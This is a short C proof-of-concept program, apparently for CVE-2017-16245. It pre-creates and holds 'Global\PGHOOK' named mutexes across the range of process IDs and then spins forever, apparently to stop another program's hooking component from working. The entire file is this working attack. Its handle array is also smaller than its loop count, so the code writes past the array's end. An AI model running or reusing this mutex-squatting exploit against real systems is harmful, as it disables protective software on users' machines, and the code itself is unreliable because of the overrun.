/* i686-w64-mingw32-gcc cve_2017_16245.c -o cve_2017_16245 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <windows.h> 
#include <tchar.h>
int main(int argc, char *argv[]) 
{ 
    
    int pid, n, i;
    char name[100], bla[100];
    HANDLE v[15400];
    pid = 1000;
    n = 65535;

    for (i = 0; 4*i < n; i++){
        sprintf(name, "Global\\PGHOOK%d",pid+4*i);
        printf ("Creating %s\r\n",name);
        v[i] = CreateMutex(NULL, TRUE, name);
        if (v[i] == NULL){
            printf("Failed\r\n");
        }
    }
    while(1);
    return 0; 
}
